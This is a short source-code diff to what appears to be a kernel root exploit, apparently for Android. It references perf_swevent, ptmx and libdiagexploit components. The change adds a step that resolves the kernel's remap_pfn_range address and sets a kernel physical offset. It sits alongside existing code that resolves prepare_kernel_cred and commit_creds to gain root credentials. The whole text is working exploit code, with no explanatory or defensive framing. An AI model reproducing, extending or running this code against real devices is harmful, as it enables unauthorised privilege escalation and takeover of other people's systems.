@@ -12,6 +12,7 @@
 #include <fcntl.h>
 
 #include "cred.h"
+#include "mm.h"
 #include "perf_swevent.h"
 #include "ptmx.h"
 #include "libdiagexploit/diag.h"
@@ -79,8 +80,15 @@ main(int argc, char **argv)
   int fd;
   bool success;
 
+  set_kernel_phys_offset(0x200000);
+  remap_pfn_range = get_remap_pfn_range_address();
+  if (!remap_pfn_range) {
+    printf("You need to manage to get remap_pfn_range addresses.\n");
+    exit(EXIT_FAILURE);
+  }
+
   if (!setup_creds_functions()) {
-    printf("You need to manage to get prepare_kernel_cred and commit_creds addresses.\n");
+    printf("Failed to get prepare_kernel_cred and commit_creds addresses.\n");
     exit(EXIT_FAILURE);
   }
 
